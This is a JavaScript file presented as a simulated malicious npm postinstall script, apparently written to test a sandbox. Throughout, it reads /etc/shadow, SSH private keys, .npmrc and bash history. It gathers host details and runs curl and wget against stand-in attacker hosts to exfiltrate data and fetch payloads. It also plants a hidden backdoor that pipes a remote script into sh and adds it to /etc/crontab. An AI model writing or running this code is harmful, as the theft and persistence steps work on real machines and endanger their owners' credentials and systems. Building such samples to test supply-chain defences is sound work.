// Simulated malicious postinstall script
// This mimics real-world supply chain attack behavior

const fs = require('fs');
const { execSync } = require('child_process');
const os = require('os');

console.log('[*] evil-pkg postinstall running...');

// 1. CREDENTIAL THEFT — Read sensitive files
const sensitiveFiles = [
    '/etc/shadow',
    '/etc/passwd',
    '/root/.ssh/id_rsa',
    '/root/.ssh/authorized_keys',
    '/root/.bashrc',
    '/root/.bash_history',
    '/proc/self/environ',
    '/root/.npmrc',
    '/root/.gitconfig',
];

sensitiveFiles.forEach(file => {
    try {
        const data = fs.readFileSync(file, 'utf8');
        console.log(`[STOLEN] ${file}: ${data.substring(0, 50)}...`);
    } catch (e) {
        // File doesn't exist or no permission — attacker would silently continue
    }
});

// 2. RECONNAISSANCE — Gather system info
try {
    console.log('[RECON] Hostname:', os.hostname());
    console.log('[RECON] Platform:', os.platform(), os.arch());
    console.log('[RECON] User:', os.userInfo().username);
    
    // Try to enumerate network interfaces
    const nets = os.networkInterfaces();
    Object.keys(nets).forEach(name => {
        nets[name].forEach(net => {
            if (net.family === 'IPv4') {
                console.log(`[RECON] Network: ${name} = ${net.address}`);
            }
        });
    });
} catch(e) {}

// 3. REVERSE SHELL ATTEMPT — Try to spawn shell commands
try {
    execSync('whoami');
    execSync('id');
    execSync('uname -a');
    execSync('cat /etc/os-release');
} catch(e) {}

// 4. DATA EXFILTRATION ATTEMPT — Try to use curl/wget (will fail due to network=none)
try {
    execSync('curl -s http://attacker.evil.com/exfil?data=stolen 2>/dev/null || true');
} catch(e) {}
try {
    execSync('wget -q http://attacker.evil.com/payload -O /tmp/payload 2>/dev/null || true');
} catch(e) {}

// 5. PERSISTENCE — Try to write to crontab and startup files
try {
    fs.writeFileSync('/tmp/.hidden_backdoor', '#!/bin/sh\ncurl http://evil.com/c2 | sh\n');
    execSync('chmod +x /tmp/.hidden_backdoor');
} catch(e) {}

try {
    fs.appendFileSync('/etc/crontab', '\n* * * * * root /tmp/.hidden_backdoor\n');
} catch(e) {}

console.log('[*] evil-pkg postinstall complete — data exfiltrated (simulated)');
